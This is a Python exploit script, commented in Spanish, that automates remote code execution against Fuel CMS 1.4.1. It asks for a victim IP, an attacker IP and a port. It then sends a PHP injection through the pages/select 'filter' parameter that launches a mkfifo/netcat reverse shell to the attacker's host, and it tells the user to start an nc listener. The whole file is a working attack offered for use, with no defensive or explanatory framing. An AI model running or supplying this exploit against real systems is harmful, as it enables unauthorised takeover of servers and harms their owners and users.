#!/usr/bin/python3

# Exploit Title: fuelCMS 1.4.1 - Reverse Shell Automática
# Autor mod: Eduardo 

import requests
import urllib
import sys
import time

class col:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    RESET = '\033[0m'

def banner():
    print(col.BLUE + r"""
 ______         _ _____ ___  ___ _____ 
|  ___|        | /  __ \|  \/  |/  ___|
| |_ _   _  ___| | /  \/| .  . |\ `--. 
|  _| | | |/ _ \ | |    | |\/| | `--. \
| | | |_| |  __/ | \__/\| |  | |/\__/ /
\_|  \__,_|\___|_|\____/\_|  |_/\____/ 
  Exploit directo - Reverse Shell
""" + col.RESET)

def lanzar_shell(victim_ip, attacker_ip, port):
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {port} >/tmp/f"
    encoded = urllib.parse.quote(payload)
    url = f"http://{victim_ip}/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27{encoded}%27)%2B%27"
    
    print(col.GREEN + f"\n[✓] Ejecutando payload de reverse shell contra {victim_ip}..." + col.RESET)
    try:
        requests.get(url, timeout=10)
        print(col.GREEN + f"[✓] Payload enviado. Abre un listener en tu terminal con:\n" + col.BLUE + f"    nc -nlvp {port}\n" + col.RESET)
        print(col.GREEN + "[*] Esperando conexión..." + col.RESET)
    except requests.exceptions.RequestException as e:
        print(col.RED + f"[!] Error al conectar con la víctima: {e}" + col.RESET)

if __name__ == "__main__":
    banner()
    victim_ip = input(col.BLUE + "[+] Ingresa la IP de la víctima: " + col.RESET).strip()
    attacker_ip = input(col.BLUE + "[+] Ingresa tu IP (atacante): " + col.RESET).strip()
    port = input(col.BLUE + "[+] Ingresa el puerto donde vas a escuchar: " + col.RESET).strip()
    
    lanzar_shell(victim_ip, attacker_ip, port)
